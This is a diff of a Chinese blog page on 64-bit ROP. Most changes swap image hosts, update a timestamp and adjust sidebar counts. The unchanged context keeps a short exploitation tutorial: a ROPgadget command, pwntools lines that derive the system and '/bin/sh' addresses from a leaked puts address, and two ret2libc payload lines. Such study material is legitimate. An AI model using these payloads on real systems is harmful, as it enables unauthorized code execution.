@@ -89,14 +89,14 @@
 <meta property="og:site_name" content="Sakuraのblog">
 <meta property="og:description" content="考察知识点 64位rop  原理寄存器传参64位和32位程序的不同点之一就是，它的前6个参数是通过寄存器传递的，有更多的参数才用栈，所以构造rop链的方式和32位不同。 利用利用思路构造rop,leak出libc地址，调用system(“/bin/sh”) 环境准备本机测试，所以我先找到自己本机用到的libc.so gadaget准备ROPgadget –binary xxx –only “pop">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-02-27-003022.png">
-<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-02-27-005750.png">
-<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-02-27-012434.png">
-<meta property="og:updated_time" content="2018-04-03T11:56:54.406Z">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-003022.png">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-005750.png">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-012434.png">
+<meta property="og:updated_time" content="2018-10-22T14:25:51.723Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="64位rop的一些原理和思路(慢慢更新)">
 <meta name="twitter:description" content="考察知识点 64位rop  原理寄存器传参64位和32位程序的不同点之一就是，它的前6个参数是通过寄存器传递的，有更多的参数才用栈，所以构造rop链的方式和32位不同。 利用利用思路构造rop,leak出libc地址，调用system(“/bin/sh”) 环境准备本机测试，所以我先找到自己本机用到的libc.so gadaget准备ROPgadget –binary xxx –only “pop">
-<meta name="twitter:image" content="http://onc55v8te.bkt.clouddn.com/2018-02-27-003022.png">
+<meta name="twitter:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-003022.png">
 
 
 
@@ -452,10 +452,10 @@
         <h2 id="考察知识点"><a href="#考察知识点" class="headerlink" title="考察知识点"></a>考察知识点</h2><ul>
 <li>64位rop</li>
 </ul>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="寄存器传参"><a href="#寄存器传参" class="headerlink" title="寄存器传参"></a>寄存器传参</h3><p>64位和32位程序的不同点之一就是，它的前6个参数是通过寄存器传递的，有更多的参数才用栈，所以构造rop链的方式和32位不同。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-02-27-003022.png" alt=""></p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="寄存器传参"><a href="#寄存器传参" class="headerlink" title="寄存器传参"></a>寄存器传参</h3><p>64位和32位程序的不同点之一就是，它的前6个参数是通过寄存器传递的，有更多的参数才用栈，所以构造rop链的方式和32位不同。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-003022.png" alt=""></p>
 <h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>构造rop,leak出libc地址，调用system(“/bin/sh”)</p>
-<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>本机测试，所以我先找到自己本机用到的libc.so<br><img src="http://onc55v8te.bkt.clouddn.com/2018-02-27-005750.png" alt=""></p>
-<h3 id="gadaget准备"><a href="#gadaget准备" class="headerlink" title="gadaget准备"></a>gadaget准备</h3><p>ROPgadget –binary xxx –only “pop|ret”<br><img src="http://onc55v8te.bkt.clouddn.com/2018-02-27-012434.png" alt=""></p>
+<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>本机测试，所以我先找到自己本机用到的libc.so<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-005750.png" alt=""></p>
+<h3 id="gadaget准备"><a href="#gadaget准备" class="headerlink" title="gadaget准备"></a>gadaget准备</h3><p>ROPgadget –binary xxx –only “pop|ret”<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-012434.png" alt=""></p>
 <h3 id="leak-system地址和-bin-sh"><a href="#leak-system地址和-bin-sh" class="headerlink" title="leak system地址和/bin/sh"></a>leak system地址和/bin/sh</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system_addr = libc.symbols[&apos;system&apos;] - libc.symbols[&apos;puts&apos;] + u64(puts_addr)</span><br><span class="line">sh_addr = next(libc.search(&apos;/bin/sh&apos;))- libc.symbols[&apos;puts&apos;] + u64(puts_addr)</span><br></pre></td></tr></table></figure>
 <h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1=padding+p64(pop_rdi_ret) + p64(puts_got_addr) + p64(puts_plt_addr)</span><br><span class="line"></span><br><span class="line">payload2=padding+p64(pop_rdi_ret) + p64(sh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure>
       
@@ -590,7 +590,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">97</span>
+                  <span class="site-state-item-count">95</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -601,7 +601,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -612,7 +612,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-count">44</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
